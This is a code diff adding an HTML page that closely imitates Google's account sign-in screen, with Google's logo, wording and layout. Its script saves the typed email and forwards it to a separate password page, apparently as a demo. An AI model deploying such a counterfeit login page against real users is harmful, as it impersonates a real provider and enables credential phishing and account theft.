@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in – Google accounts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #f2f6fc;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            background: #fff;
+            border-radius: 28px;
+            box-shadow: 0 2px 10px rgba(60,64,67,.15);
+            width: 90vw;
+            max-width: 900px;
+            min-width: 0;
+            margin: 100px auto 0 auto;
+            padding: 48px 40px 36px 40px;
+            display: flex;
+            flex-direction: row;
+            align-items: flex-start;
+            box-sizing: border-box;
+            transition: max-width 0.3s, padding 0.3s, flex-direction 0.3s;
+        }
+        .left, .right {
+            display: flex;
+            flex-direction: column;
+        }
+        .left {
+            max-width: 320px;
+            margin-right: 40px;
+            flex: none;
+        }
+        .right {
+            flex: 2;
+            justify-content: flex-start;
+            margin-top: 0;
+        }
+        .right-inner {
+            margin-top: 0;
+        }
+        /* Align input top with Sign in top */
+        #input-align {
+            margin-top: 0;
+        }
+        @media (min-width: 701px) {
+            .container {
+                position: relative;
+            }
+            .right-inner {
+                /* Dynamically align input with Sign in */
+                margin-top: calc(
+                    (40px + 32px) - 16px
+                ); /* 40px logo + 32px h1 - 16px h1 bottom margin */
+            }
+        }
+        @media (max-width: 600px) {
+            .container {
+                max-width: 98vw;
+                padding: 24px 8px;
+                margin-top: 24px;
+            }
+        }
+        .google-logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 400;
+            margin: 0 0 16px 0;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #3c4043;
+            margin-bottom: 32px;
+        }
+        .input-box {
+            width: 100%;
+            margin-bottom: 8px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 16px 12px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            margin-bottom: 4px;
+        }
+        input[type="text"]:focus {
+            border-color: #4285f4;
+        }
+        .forgot {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 24px;
+            display: inline-block;
+        }
+        .guest-mode {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+        .guest-mode a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .actions {
+            display: flex;
+            width: 100%;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 16px; /* Add spacing between buttons */
+            margin-top: 16px; /* Optional: add some space above */
+        }
+        .create-account {
+            color: #1a73e8;
+            background: none;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+            padding: 0 8px 0 0;
+        }
+        .next-btn {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            padding: 10px 32px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .next-btn:hover {
+            background: #1765c1;
+        }
+        .footer-bar {
+            width: 100%;
+            max-width: 900px;
+            margin: 24px auto 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+            padding: 0 40px;
+        }
+        .lang-select {
+            font-size: 12px;
+            color: #5f6368;
+            display: flex;
+            align-items: center;
+        }
+        .footer {
+            color: #5f6368;
+            font-size: 14px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+        }
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 16px;
+        }
+        @media (max-width: 700px) {
+            .container {
+                flex-direction: column;
+                max-width: 98vw;
+                width: 100%;
+                padding: 24px 8px;
+                margin-top: 24px;
+                align-items: stretch;
+            }
+            .left {
+                margin-right: 0;
+                max-width: 100%;
+                align-items: flex-start;
+            }
+            .right {
+                width: 100%;
+            }
+            .right-inner {
+                margin-top: 0 !important;
+            }
+            .footer-bar {
+                flex-direction: column;
+                align-items: center;
+                padding: 0 8px;
+                gap: 8px;
+            }
+            .footer {
+                justify-content: center;
+                padding-right: 0;
+            }
+            .lang-select {
+                justify-content: center;
+                padding-left: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <img class="google-logo" src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" alt="Google">
+            <h1 id="sign-in-title">Sign in</h1>
+            <div class="subtitle">
+                with your Google Account. This account will be available to other Google apps in the browser.
+            </div>
+        </div>
+        <div class="right">
+            <div class="right-inner">
+                <form id="signin-form">
+                    <div class="input-box" id="input-align">
+                        <input type="text" id="email-input" name="email" placeholder="Email or phone" required>
+                    </div>
+                    <a class="forgot" href="#">Forgot email?</a>
+                    <div class="guest-mode">
+                        Not your computer? Use Guest mode to sign in privately.
+                        <a href="#">Learn more about using Guest mode</a>
+                    </div>
+                    <div class="actions">
+                        <a class="create-account" href="#">Create account</a>
+                        <button class="next-btn" type="submit">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <div class="footer-bar">
+        <div class="lang-select">
+            English (United States)
+            <span style="font-size:12px;">&#9660;</span>
+        </div>
+        <div class="footer">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+    <script>
+        document.getElementById('signin-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var email = document.getElementById('email-input').value;
+            // Store email for password page (for demo, use localStorage)
+            localStorage.setItem('signin_email', email);
+            // Redirect with email in query string as well
+            window.location.href = 'password.html?email=' + encodeURIComponent(email);
+        });
+    </script>
+</body>
+</html>
